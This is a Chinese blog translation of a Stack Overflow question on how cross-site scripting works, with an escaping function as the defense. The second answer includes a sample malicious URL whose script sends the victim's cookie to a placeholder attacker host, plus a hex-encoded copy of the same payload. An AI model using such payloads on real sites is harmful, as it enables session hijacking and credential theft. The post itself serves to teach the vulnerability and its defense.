---
title: XSS 工作原理
sticky: 0
copyright: false
date: 2017-12-17 19:09:00
categories:
- stackoverflow 高赞翻译
tags:
- stackoverflow
- XSS
- 网络安全
---

> **文章原址：** https://stackoverflow.com/questions/239194/how-does-xss-work

<!-- more -->

# 问题描述：

能不能用简单的语言介绍一下 XSS 的工作原理，最好举一个例子，谷歌不能很好的检索这个问题。
(Ask by  **Vicky**)

# 高赞回答

当 XSS 存在时，外部应用程序的字符串被解释为代码。
如果你的 HTML 是这样的：

```xml
<BODY>
  <?= $myQueryParameter ?>
</BODY>
```

如果变量 `$myQueryParameter` 包含一个 `<SCRIPT>` 标签，它将最终执行（`<SCRIPT>` 中的）代码。
为了防止输入作为代码执行，必须恰当的**转义**某些内容。
上面的问题可以通过让变量 `$myQueryParameter` 包含纯文本解决，但不能把纯文本直接放到HTML中并期望它执行。
所以让纯文本变成 HTML，这样才能让它在 HTML 页面中显示。将一种语言的字符串转换成另一种语言就可以嵌入了。
你可以执行一个函数来把纯文本转义成 HTML，如：

```js
function escapePlainTextToHTML(plainText) {
  return plainText.replace(/\0/g, '')
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&#34;')
      .replace(/'/g, '&#39;');
}
```

（answered by <B>[Mike Samuel](https://stackoverflow.com/users/20394/mike-samuel)</B>）

---

跨站脚本（XSS）主要是动态网站页面的安全漏洞，攻击者创建一个恶意链接向网站植入可执行的恶意 JavaScript 代码。大多数情况下，这种漏洞在 GET 变量无需过滤或检测内容就能输出或响应时复现。
当受害人点击链接，恶意代码能发送受害人的 cookie 到另一台服务器，或者修改受影响的站点，注入表单，窃取用户名和密码，和其他钓鱼诈骗方法。
恶意链接例子：

```
http://VulnerableHost/a.php?variable=<script>document.location='http://AttackersHost/cgi-bin/cookie.cgi%3Fdata='+document.cookie</script>
```

也能编译恶意代码，十六进制如下：

```
http://VulnerableHost/a.php?variable=%22%3E%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%41%74%74%61%63%6B%65%72%73%48%6F%73%74%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%2E%63%67%69%3F%20%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73%63%72%69%70%74%3E
```
（answered by <B>[CMS](https://stackoverflow.com/users/5445/cms)</B>）
